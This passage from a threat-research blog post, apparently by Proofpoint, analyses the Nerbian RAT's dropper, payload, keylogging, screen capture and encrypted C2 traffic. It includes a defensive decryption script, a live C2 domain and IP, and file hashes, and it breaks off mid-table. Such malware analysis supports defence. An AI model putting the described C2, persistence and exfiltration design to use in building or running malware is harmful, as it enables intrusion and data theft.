i1FgHAUCc8pC32h3GRlYfAu/0caNlVpKLD/De8oTp6ySb2mvhCaoi8koCWMueO5jkw2gxYQPKMwWF/C0iOEEEIIISQYZRfrPnv62ejBaPRR6+LD8ffH1b12inQ6jaMt/nS+nOZjzTpVV4cW8vm8zpgpFAoDbw6cSJyIRqNNjzSlv03bD+0UhqFAkFC4V8CpWueL+NYSmPp0KncnN3C+dClmiYY6nNd1ujpisZKWwgfC1WhDIQ3DQOC+ul+wtNR9ttpLmmUHsPBSVPZONpEoFcLc2dtZlRbsJdTaCp5TDtaXafBwy5W7K3BsdbUwsK4rvuN/g6j/MCrUK/RlXZS7bl16vXxvuffl3vmv5nO5HOLnSCQCaYC+bDyXHiGEEEIIIcEoC0dxWl26vZSaTMWOxkYvj8Yfj+PoqWUy5c+GWVv3/zWIzj90zn05N3JpJP1VOnsriwOuXct3GGOXxwbfGkR0geO4LtrK4OvqLl642Ptar+ezZBHj6ZSTWp6FU402FMIwqqT6vnpe7IEa259p1/kt460oM1uxVzBqnrLZyvLgU1Mp/WlPkdXihbIAwXzubsBnF5nU69kXOgqFrIt4W0+2YoRra2vzN+erf46RYErPpUcIIYQQQkgwKp6s22B9AYK4KJPO4IQ9d9N6CApIJBK573PBzqA4Gdet67QNYtGht4fanm6LHIpEDkbUk1dKGIah6H6+GyKcszvOdOgihVjLxMyNmex32aE3a3jmUDgcXr2vYwwQOMZwIg/DU4dbAQEVQt/q4+pgDhA/Gk+nSw/CWUwvxo85giKDvXxqiQiK8pyy0JePlb0GHz4YRi/wbfUSFx2nO2DlQsEj6g4wZbkvBJ+T1ydbnmpBurWlFWn7OUZbUa9x6RFCCCGEEFI7ZeHo1PWp8Q/Hs99mEXWMfzSOA3ficX1VXveZ7tjhWPvpdhx/EZbgVD3+frU/g9kcb566MYUj+9pa6bs7nInVAz8RPPSd74O0WGwhDKNEQ13qeir9TXrov3X8VlUtL4YuDPW81FPTd5KtJ1sXvl5A9Ij06N9HnYMPjDwMTx3uJMEcoPfV3omPJyY/nszdyQ2/O5z+Ot33un4cq2AvoZYvtSpK6EuwsjB4RGsQoSlUhH9CS/YTj5FAiNv2dBu0BxE6tUXBpiz0heATTSEQRbrtt21IQzNKtBX1WlQsPUIIIYQQQgKiL/IrMvvFbMtvWnBiDoVCiScS059Na0GR5eXlrrNdiJcgjR+P21LhiS+KxfRi4smE9bXV5mNgVWHLUy2RSARBzuBbgzijIxhTImEY9uM9VTZ5zfrpjtk563mh8uBNqIe+YGo6X87YB2NoUGfKsULHcNga/J8HnVP21YYn8jCApw4D9GU/18dmyfFcH7SGtJP4Y/oxPMDkAEBQFEKmyKEIZhc7GoO9dKmfvUy1FMKjjCoVJU8ZCH2ZrCwPHo2gEA3iBXBs5/W0yz8sd52xdAgpdHvlqjYlEIYhqNfUF1rDHPM/Wo9onr85j7RzGAH6EpYeIYQQQgghwajHfzhW/mJpbWk9kTihnia6i+yRYRBCCCGEEELIjlFx7+gviUKh0PZM265fc7hHhkEIIYQQQgghO8kv/dtRQgghhBBCCCG7wi/621FCCCGEEEIIIbtDXd3/AvYcUXZ0SB+QAAAAAElFTkSuQmCC" unselectable="on"></p>

<p>The dropper's end-goal is to download the executable named SSL, save it as MoUsoCore.exe, and configure a scheduled task to run it hourly as its primary persistence mechanism.</p>

<h3><strong>Payload - MoUsoCore.exe</strong></h3>

<p>MoUsoCore.exe is the name of the payload that the dropper binary, UpdateUAV.exe, attempts to download and establish persistence for. Like the dropper itself, it is written in Go, and is UPX packed. The size of the binary in its packed state is 5.6MB, while in its unpacked state is 9.2MB.</p>

<h3><strong>Functionality and Configuration Settings</strong></h3>

<p>Nerbian RAT seems to support a variety of different functions, most of which are dictated by encrypted configuration settings in the binary itself. Proofpoint identified various configuration settings this sample utilizes:</p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">"185.121.139[.]249"</span></span></span><br>
<span style="font-size:12.0pt"><span style="line-height:107%">https://www</span></span><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">[</span></span></span><span style="font-size:12.0pt"><span style="line-height:107%">.</span></span><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">]</span></span></span><span style="font-size:12.0pt"><span style="line-height:107%">fernandestechnical</span></span><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">[</span></span></span><span style="font-size:12.0pt"><span style="line-height:107%">.</span></span><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">]</span></span></span><span style="font-size:12.0pt"><span style="line-height:107%">com/pub/health_check.php</span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">"100"</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">\\\\ProgramData\\\\Microsoft OneDrive\\\\setup</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">"rev.sav"</span></span></span></span></span></span></p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">===Configuration===</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">default_communication_protocol: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">default_conn_interval: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">b_use_alive_signal: %t</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">start_worktime: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">end_worktime: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">alive_interval: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">b_use_secondary_host: %t</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">b_use_sleep_filetransfer: %t</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">time_sleep_filetransfer: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">retry_count_filetransfer: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">connection_error_sleep_time: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">bpreflaged_use_backupserver: %t</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">flagged_time_backupserver: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">switch_backupserver_time: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">primary_host: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">secondary_host: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">primary_http_proxyserver: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">secondary_http_proxyserver: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">working_directory: %s</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">b_run_cmd_result_outfile: %t</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">idle_state_limit_time: %d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">st:%d</span></span></span><br>
<span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Consolas">nt: %d</span></span></span></span></span></span></p>

<p>Many of these strings pertain to setting operating parameters for the malware such as what hosts it communicates with, how often it checks in to the C2 domains and IP addresses with keep-alive messages, the malware’s preferred working directory, and the hours in which it operates, in addition to other parameters.</p>

<p>It's likely that 185[.]121[.]139[.]249 and hxxps://www[.]fernandestechnical[.]com/pub/health_check.php are the designated C2 backup domains and URI for keep-alives and check-ins.</p>

<h3><strong>Keylogging</strong></h3>

<p>The RAT appears to have the ability to log keystrokes and appears to write them, encrypted, to the rev.sav file mentioned in the configuration settings above.</p>

<h3><strong>Screen Capture</strong></h3>

<p>Not unlike the dropper, the RAT utilizes a lot of pre-existing Go code to perform many of its functions:</p>

<p style="margin-left:48px; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-family:Helvetica">github.com/lxn/win</span><br>
<span style="font-family:Helvetica">github.com/go-ole/go-ole</span><br>
<span style="font-family:Helvetica">github.com/StackExchange/wmi</span><br>
<span style="font-family:Helvetica">github.com/digitalocean/go-smbios/smbios</span><br>
<span style="font-family:Helvetica">github.com/AllenDang/w32.init</span></span></span></span></p>

<p>Again, out of all of these, one of the more interesting external references is to the following GitHub repo:</p>

<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;github.com/kbinani/screenshot/&nbsp;</p>

<p>This repo is a Go library for performing screen captures on a variety of different operating systems.</p>

<h3><strong>C2 Communications</strong></h3>

<p>As with most modern malware families, this RAT prefers to handle its communications over SSL. Proofpoint observed two types of network traffic. The first is a simple Heartbeat/Keep-Alive to the C2 domains/IP addresses.</p>

<p><img alt="C2 domain/IP addresses" data-entity-type="file" data-entity-uuid="79cfc058-14aa-4de0-a76b-2f53d5083314" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.00.31%20AM.png" width="409" height="143" loading="lazy"></p>

<p><em>Figure 9: The Heartbeat/Keep-alive traffic to the C2 domain/IP addresses. Please disregard the extra "p" at the end of /pub/health_check.php.</em></p>

<p>Additional communication observed was a POST request to the configured C2 domains and IP addresses with a large collection of HTTP form data being uploaded in the request:</p>

<p><img alt="base64 " data-entity-type="file" data-entity-uuid="6c96fa06-c65a-4ef3-ba93-477a14b655c7" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.00.47%20AM.png" width="1152" height="536" loading="lazy"></p>

<p><em>Figure 10: Notice the different names in the Content-Disposition field for each form in this POST request. All of this data is both base64 encoded and encrypted, regardless of whether the C2 communication is happening over HTTP or HTTPS.</em></p>

<p>Form-data names being posted to the C2 server include:</p>

<p><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">addr_post </span></span></span> – IP address posting to</p>

<p><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">port_post </span></span></span> – network port posting to</p>

<p><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">auth_post </span></span></span> – likely a per-session encryption key or password used after initializing the C2 communication</p>

<p><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">session_key </span></span></span> – the only field that isn't encrypted. This is a combination of a string that serves as a sort of campaign identifier, a hash of values retrieved via the SMBIOS Golang module, and the operating system designation of the system talking to the C2 server (in this case "windows").&nbsp;</p>

<p><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">data_post </span></span></span> – exfiltrated data from the victim host</p>

<p>All of the fields above, with exception of session_key form data field, utilize a unique encryption scheme. The first 70 bytes of the POST are "garbage", while the next 24 bytes contain an AES key that can be used to decrypt the remaining data. Proofpoint researchers developed a Python script that will enable decrypting this posted data:</p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">import malduck</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">import binascii</span></span></span></span></span></span></p>

<p style="margin-bottom:11px"><br>
<span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">data = "BgxxweBaPoZVPcfLoQFSHMfqqeitJaZjoSKOBrhsCxtDMYGxPUHsKYcXetaTSJaSULtqZQAwoDiTrCtDpVKvaLxjZPSLcLBvlyREEguzuO0Z8119x2/7cc2XoU2w=="</span></span></span></span></span></span></p>

<p style="margin-bottom:11px"><br>
<span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">def decrypt_post_param(base64_encoded_content):</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; junk = base64_encoded_content[:70]</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; key = base64_encoded_content[70:70+32]</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; print("[+] key: %s" % key)</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; crypted_data = base64_encoded_content[70+32:].encode("utf-8")</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; base64_decoded = malduck.base64.decode(crypted_data)</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; iv = key[:16].encode("utf-8")</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; full_data = base64_decoded</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; print("[+] crypted data [%d]: %s" % (len(full_data), binascii.hexlify(full_data)))</span></span></span><br>
<span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">&nbsp;&nbsp;&nbsp; return malduck.aes.cbc.decrypt(key.encode("utf-8"), iv, full_data)</span></span></span></span></span></span><br>
&nbsp;</p>

<p style="margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:Consolas">print(decrypt_post_param(data)) </span></span></span></span></span></span></p>

<p><img alt="Python script " data-entity-type="file" data-entity-uuid="797e2d19-1283-420a-ab89-2b9912cac2cb" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.03%20AM.png" width="908" height="160" loading="lazy"></p>

<p><em>Figure 11: Python script for decrypting posted data.&nbsp;</em></p>

<p>Using the code above, users can decrypt the data being posted. In this instance, Proofpoint chose to decrypt the base64 encoded data from the addr_post field from an internal sandbox run. Users will need to replace the data variable with the base64 encoded block they wish to decrypt, or otherwise modify the script to accept input.</p>

<p>As mentioned above however, the session_key field is not encrypted, it is base64 encoded. What does this field contain?</p>

<p><img alt="session key" data-entity-type="file" data-entity-uuid="d50b1f5d-e3b3-44d3-afb1-799de0e1cba9" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.16%20AM.png" width="1101" height="369" loading="lazy"></p>

<p><em>Figure 12: The value of the session_key field is just a concated string, containing three values that are base64 encoded.</em></p>

<p>When submitted to Cyberchef using the From Base64 recipe, the base64 encoded string:</p>

<p style="margin-left:48px; margin-bottom:11px"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">OGZmZTQ1MDU5N2NiYmZhNWE3MDNlMjNhOGI2YmJkYWVkYTc2YmFkZjJiMDM1ZTc1ZGU1ZmZkYjNhZjA3MjcwZDoyNWI0ZWJjYTRiYmM4MmFiNWFlMmU1MTdjMjlkMzNlNzp3aW5kb3dz</span></span></span></p>

<p>Decodes to:</p>

<p style="text-indent:.5in; margin-bottom:11px"><span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d:25b4ebca4bbc82ab5ae2e517c29d33e7:windows</span></span></span></span></span></span></p>

<p>This string contains three values, concatenated and delimited with the ":" character. Proofpoint assesses the first value, <span style="font-size:9.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">8ffe450597cbbfa5a703e23a8b6bbdaeda76badf2b035e75de5ffdb3af07270d</span></span></span> is some sort of an implant or campaign identifier, while <span style="font-size:9.0pt"><span style="line-height:107%"><span style="font-family:Helvetica">25b4ebca4bbc82ab5ae2e517c29d33e7</span></span></span> is a value derived from host identifier data collected using the&nbsp;<a href="https://github.com/digitalocean/go-smbios/smbios" target="_blank">go-smbios</a>&nbsp;library mentioned above, while the final value is the operating system of the compromised host (windows)</p>

<p><img alt="Nerbian RAT " data-entity-type="file" data-entity-uuid="6581d949-f0f1-44d4-ad6e-372639530c95" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.01.28%20AM.png" width="1078" height="363" loading="lazy"></p>

<p><em>Figure 13: The process flow of Nerbian RAT</em></p>

<h3><strong>Assessment</strong></h3>

<p>This is a complex piece of malware, consisting of three stages:</p>

<ul>
	<li>Maldoc phishing lure</li>
	<li>Dropper that performs a large variety of environment checking – anti-reversing and anti-VM checks</li>
	<li>Nerbian RAT – encrypted configuration file, extreme care to ensure data is encrypted to the C2</li>
</ul>

<p>Despite all this complexity and care being taken to protect the data in transit and "vet" the compromised host, the dropper and the RAT itself do not employ heavy obfuscation outside of the sample being packed with UPX, which it can be argued isn't necessarily for obfuscation, but to simply reduce the size of the executable.</p>

<p>Additionally, much of the functionality of both the RAT and the dropper are easy to infer due to the strings referring to GitHub repositories – specifically the Chacal and screenshot repositories exposes partial functionality of both the dropper and the RAT.</p>

<h3><strong>Why Nerbian RAT?</strong></h3>

<p>At first it was hard to find any references to "Nerbian" on the internet, until Proofpoint analysts came across this passage in Don Quixote:</p>

<blockquote>
<p><em>“But turn thine eyes to the other side, and thou shalt see in front and</em></p>

<p><em>&nbsp;in the van of this other army the ever victorious and never vanquished</em></p>

<p><em>&nbsp;Timonel of Carcajona, prince of New Biscay, who comes in armour with</em></p>

<p><em>&nbsp;arms quartered azure, vert, white, and yellow, and bears on his shield</em></p>

<p><em>&nbsp;a cat or on a field tawny with a motto which says Miau, which is the</em></p>

<p><em>&nbsp;beginning of the name of his lady, who according to report is the</em></p>

<p><em>&nbsp;peerless Miaulina, daughter of the duke Alfeniquen of the Algarve; the</em></p>

<p><em>&nbsp;other, who burdens and presses the loins of that powerful charger</em></p>

<p><em>&nbsp;and bears arms white as snow and a shield blank and without any</em></p>

<p><em>&nbsp;device, is a novice knight, a Frenchman by birth, Pierres Papin by</em></p>

<p><em>&nbsp;name, lord of the baronies of Utrique; that other, who with</em></p>

<p><em>&nbsp;iron-shod heels strikes the flanks of that nimble parti-coloured</em></p>

<p><em>&nbsp;zebra, and for arms bears azure vair, is the mighty&nbsp;</em><strong><em>duke of Nerbia,</em></strong></p>

<p><em>&nbsp;</em><strong><em>Espartafilardo del Bosque, who bears for device on his shield an</em></strong></p>

<p><em>&nbsp;</em><strong><em>asparagus plant with a motto in Castilian that says, Rastrea mi</em></strong></p>

<p><em>&nbsp;</em><strong><em>suerte."</em></strong></p>
</blockquote>

<p>Nerbia is a fictional place from the great novel Don Quixote. The knight from Nerbia had a shield with a crest of asparagus and a banner reading "Try your luck".</p>

<p><img alt="Nerbian RAT " data-entity-type="file" data-entity-uuid="647298db-0283-4d47-a88a-a31d6cddd3ff" src="/sites/default/files/inline-images/Screen%20Shot%202022-05-10%20at%209.02.06%20AM.png" width="705" height="654" loading="lazy"></p>

<p><em>Figure 14: Nerbia is a fictional land from the novel Don Quixote. The Knight of Nerbia wore a shield with an asparagus crest with a Castilian Spanish motto that reads "Rastrea Mi Suerte." Which roughly translates to "Try your luck." In English. Please note that this crest is not associated with the novel and was created because Threat Research at Proofpoint likes to have fun.</em></p>

<p>Many of the strings referencing Nerbia were located in the companion dropper (UpdateUAV.exe). There are no references to Nerbia in the RAT payload itself (MoUsoCore.exe). Proofpoint assesses with high confidence that the dropper and RAT were both created by the same entity, and while the dropper may be modified to deliver different payloads in the future, the dropper is statically configured to download and establish persistence for this specific payload at the time of analysis.</p>

<h3><strong>Indicators of Compromise</strong></h3>

<table aria-rowcount="4" border="1" data-tablelook="1696" data-tablestyle="MsoTableGrid" style="width: 1169.67px;">
	<tbody>
		<tr aria-rowindex="1" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{5a470fd2-6334-467d-9d22-2630469b70e8}{54}" paraid="441970757">Filename&nbsp;</p>
			</td>
			<td data-celllook="0" role="columnheader" style="width: 1052px;">
			<p paraeid="{5a470fd2-6334-467d-9d22-2630469b70e8}{60}" paraid="1180024389">covid-19.doc&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="2" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{5a470fd2-6334-467d-9d22-2630469b70e8}{66}" paraid="1969353860">MD5 Hash&nbsp;</p>
			</td>
			<td data-celllook="0" style="width: 1052px;">
			<p paraeid="{4557a839-2932-46db-a768-2fdb9a04ac18}{93}" paraid="1486325564">d7888fea6047b662a30bf00edac4c3ee&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="3" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{5a470fd2-6334-467d-9d22-2630469b70e8}{74}" paraid="2065442221">SHA1 Hash&nbsp;</p>
			</td>
			<td data-celllook="0" style="width: 1052px;">
			<p paraeid="{4557a839-2932-46db-a768-2fdb9a04ac18}{126}" paraid="2092161982">8137670512be55796f612e41602f505955b0bb0c&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="4" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{5a470fd2-6334-467d-9d22-2630469b70e8}{82}" paraid="960395389">SHA256 Hash&nbsp;</p>
			</td>
			<td data-celllook="0" style="width: 1052px;">
			<p paraeid="{4557a839-2932-46db-a768-2fdb9a04ac18}{159}" paraid="381411751">ee1bbd856bf72a79221baa0f7e97aafb6051129905d62d74a37ae7754fccc3db&nbsp;</p>
			</td>
		</tr>
	</tbody>
</table>

<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{94}" paraid="479243921">&nbsp;</p>

<table aria-rowcount="5" border="1" data-tablelook="1696" data-tablestyle="MsoTableGrid">
	<tbody>
		<tr aria-rowindex="1" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{131}" paraid="872291515">Filename&nbsp;</p>
			</td>
			<td data-celllook="0" role="columnheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{137}" paraid="1673188025">UpdateUAV.exe&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="2" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{143}" paraid="1075285539">MD5 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{f8aa6939-4697-40e0-aa93-1a3265eadeb4}{183}" paraid="1897445102">9cca59eec5af63e42cd845b67cf6df89&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="3" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{151}" paraid="1372979906">SHA1 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{6c6f9586-3a94-4b0f-a553-008cbf50cf60}{130}" paraid="566754050">178aad6c7918cc495a908944e79143a913630890&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="4" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{159}" paraid="598733736">SHA256 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{6c6f9586-3a94-4b0f-a553-008cbf50cf60}{157}" paraid="1503149240">1b8c9e7c150bacd466fbe7f12b39883821f23b67cae0a427a57dc37e5ea4390f&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="5" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{07904bf5-453d-418e-bbed-70803ef3f669}{167}" paraid="985634177">Notes&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{6c6f9586-3a94-4b0f-a553-008cbf50cf60}{188}" paraid="1168413261">Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to C:\Users\[current_user]\Appdata\Roaming\UpdateUAV.exe&nbsp;<br>
			64-bit golang executable, UPX packed&nbsp;</p>
			</td>
		</tr>
	</tbody>
</table>

<p paraeid="{6c6f9586-3a94-4b0f-a553-008cbf50cf60}{226}" paraid="750936992">&nbsp;</p>

<table aria-rowcount="5" border="1" data-tablelook="1696" data-tablestyle="MsoTableGrid">
	<tbody>
		<tr aria-rowindex="1" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{103}" paraid="328416887">Filename&nbsp;</p>
			</td>
			<td data-celllook="0" role="columnheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{109}" paraid="448892222">MoUsoCore.exe&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="2" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{115}" paraid="1330585839">MD5 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{2adb596b-9e0e-49b1-b261-8710dff7238a}{173}" paraid="1067991676">5d5bc970f975341558b8d2c225ca0115&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="3" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{123}" paraid="1431048011">SHA1 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{b97dbf11-dc0e-498c-a6fe-ef1d51f885ef}{120}" paraid="1687875101">4f74826ed56cda233cfc12b86fd1b7da4a9f2e56&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="4" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{131}" paraid="1216827123">SHA256 Hash&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{b97dbf11-dc0e-498c-a6fe-ef1d51f885ef}{150}" paraid="1661805214">902c65435b6b44cfda1156b0e7c6a30b2785fa4f2cbb9b1944a66f5146ec7aa5&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="5" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{949e38e7-58fb-4efa-8433-3a64410ee36c}{139}" paraid="1753739910">Notes&nbsp;</p>
			</td>
			<td data-celllook="0">
			<p paraeid="{b97dbf11-dc0e-498c-a6fe-ef1d51f885ef}{178}" paraid="59131153">Downloaded from hxxps://www[.]fernandestechnical[.]com/pub/media/gitlog via Powershell Invoke Web Request (IWR) to C:\Users\[current_user]\Appdata\Roaming\UpdateUAV.exe&nbsp;<br>
			64-bit golang executable, UPX packed&nbsp;</p>
			</td>
		</tr>
	</tbody>
</table>

<p paraeid="{78f43d5e-eb44-4183-b773-31a23550aa08}{110}" paraid="451675314">&nbsp;</p>

<table aria-rowcount="2" border="1" data-tablelook="1696" data-tablestyle="MsoTableGrid" style="width: 1169.67px;">
	<tbody>
		<tr aria-rowindex="1" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{2cfe476f-0b04-409f-b6fd-61939331353a}{96}" paraid="850912534">Domain&nbsp;</p>
			</td>
			<td data-celllook="0" role="columnheader" style="width: 1095px;">
			<p paraeid="{b07c842e-a67a-40f3-9d88-912781574146}{228}" paraid="1050462930">www[.]fernandestechnical[.]com&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="2" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{2cfe476f-0b04-409f-b6fd-61939331353a}{108}" paraid="1110457400">Notes&nbsp;</p>
			</td>
			<td data-celllook="0" style="width: 1095px;">
			<p paraeid="{11692396-d885-4825-9929-72d21b1485bb}{159}" paraid="1092394218">hxxps://www[.]fernandestechnical[.]com/pub/health_check.php&nbsp;</p>
			</td>
		</tr>
	</tbody>
</table>

<p paraeid="{73e5e17b-779d-4852-9c1e-ad9a2aba353a}{73}" paraid="563290079">&nbsp;</p>

<table aria-rowcount="2" border="1" data-tablelook="1696" data-tablestyle="MsoTableGrid" style="width: 1157.67px;">
	<tbody>
		<tr aria-rowindex="1" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{73e5e17b-779d-4852-9c1e-ad9a2aba353a}{130}" paraid="1490690100">IP Address&nbsp;</p>
			</td>
			<td data-celllook="0" role="columnheader" style="width: 1062px;">
			<p paraeid="{850e0540-7d9a-4dbe-8c20-3ee40ae01254}{30}" paraid="1320598041">185[.]121[.]139[.]249&nbsp;</p>
			</td>
		</tr>
		<tr aria-rowindex="2" role="row">
			<td data-celllook="0" role="rowheader">
			<p paraeid="{73e5e17b-779d-4852-9c1e-ad9a2aba353a}{142}" paraid="1962941079">Notes&nbsp;</p>
			</td>
			<td data-celllook="0" style="width: 1062px;">
